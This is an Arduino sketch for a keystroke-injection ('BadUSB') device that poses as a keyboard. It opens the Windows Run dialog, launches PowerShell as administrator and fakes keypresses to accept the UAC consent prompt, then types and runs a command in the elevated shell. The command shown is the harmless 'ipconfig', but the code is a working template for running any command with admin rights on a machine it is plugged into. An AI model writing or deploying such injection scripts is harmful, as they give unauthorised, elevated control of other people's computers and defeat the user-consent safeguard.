

#include <Keyboard.h>



bool admin = 0;

void typeString(String string) {
  for (int i = 0; i < string.length(); i = i + 1) {
    Keyboard.press(string[i]);
    Keyboard.release(string[i]);
  }
}

void enterString(String string) {
  for (int i = 0; i < string.length(); i = i + 1) {
    Keyboard.press(string[i]);
    Keyboard.release(string[i]);
  }
  Keyboard.press(KEY_RETURN);
  Keyboard.release(KEY_RETURN);
}

void PowershellAsAdmin() {
  Keyboard.press(KEY_RIGHT_GUI);
  Keyboard.press('r');
  //open the windows "run" application
  Keyboard.releaseAll();
  delay(80);
  typeString("powershell -Command \"Start-Process powershell -Verb runAs\"");
  Keyboard.press(KEY_RETURN);
  Keyboard.release(KEY_RETURN);
  //run powershell as admin
  delay(550);
  Keyboard.press(KEY_TAB);
  Keyboard.release(KEY_TAB);
  Keyboard.press(KEY_TAB);
  Keyboard.release(KEY_TAB);
  Keyboard.press(KEY_RETURN);
  Keyboard.release(KEY_RETURN);
  //accept the UAC
  admin = 1;
}

String phrase = "";


void setup() {
  // put your setup code here, to run once:
  Keyboard.begin();
}

void loop() {
  delay(1000);

  phrase = "ipconfig";
  PowershellAsAdmin();
  while (admin == 0) {}
  delay(400);
  enterString(phrase);

while(true){}
           

    
}
